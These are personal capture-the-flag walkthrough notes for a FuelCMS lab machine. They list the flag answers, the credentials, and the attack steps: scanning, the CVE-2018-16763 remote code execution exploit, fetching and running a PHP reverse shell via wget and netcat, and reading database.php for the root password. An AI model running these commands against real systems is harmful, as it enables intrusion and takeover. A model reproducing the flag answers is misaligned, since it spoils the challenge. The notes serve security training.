export IP=10.10.182.10


==================================================

[TASK 1] - 

1) User.txt

	Answer: `6470e394cbf6dab6a91682cc8585059b`

2) Root.txt

	Answer: `b9bbcb33e11b80be759c4e844862482d`


==================================================

[IMPORTANT INFORMATION]

FuelCMS username: admin
FuelCMS password: admin

Server username: root
Server password: mememe


==================================================

[APPROACH]

1) Run nmap.
	
	Command: `nmap -sV -sC -oN nmap/initial $IP`

2) Run gobuster.

	Command: `gobuster dir -u http://$IP -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x html,sh,php,js,py,css -o gobuster.log`

2) Visit the website. Found out its being run by FuelCMS, which has a known exploit that allows someone to run remote code execution.

	Notes:
		- Just reading through the first page, I was able to get a lot of information about Fuel CMS.
		- CVE-2018-16763 (https://www.exploit-db.com/exploits/47138)
		- Copied and ran the python 2.7 code. See 'fuelCMS_exploit.py'.
		- This allowed me to run linux commands.

3) Using the RCE FuelCMS exploit, I was able to start a reverse shell.

	Commands:
		1) [my machine]: `python3 -m http.server`
				> Starts local file server.
		2) [RCE exploit]: `wget "http://<tun0_IP>:8000/php-reverse-shell.php"
				> Fetch the PHP reverse shell script from my machine.
		3) [my machine]: `nc -lnvp 1234`
				> Start listening for netcat connection on port 1234.
		4) [RCE exploit]: `php php-reverse-shell.php`
				> Run reverse shell script, which in turn connects to my netcat listener.

4) Once on the machine, I installed linpeas and ran a linux enumeration on the box.

	Notes:
		- That was overkill.
		- Didn't find anything.

5) Looked back at the Fuel CMS home page (http://$IP) and actually read through the documentation. I saw in there under the "Install the Database" section that usernames and passwords were stored in the 'database.php' file located at 'fuel/application/config/database.php'.
	
	Commands: 
		1) `cd /var/www/html/fuel/application/config`
		2) `cat database.php`
				> You should see towards the bottom a dictionary of values. Within those values is a username (root) and password (mememe).
		3) `su root` + `mememe`
				> You now own the box.
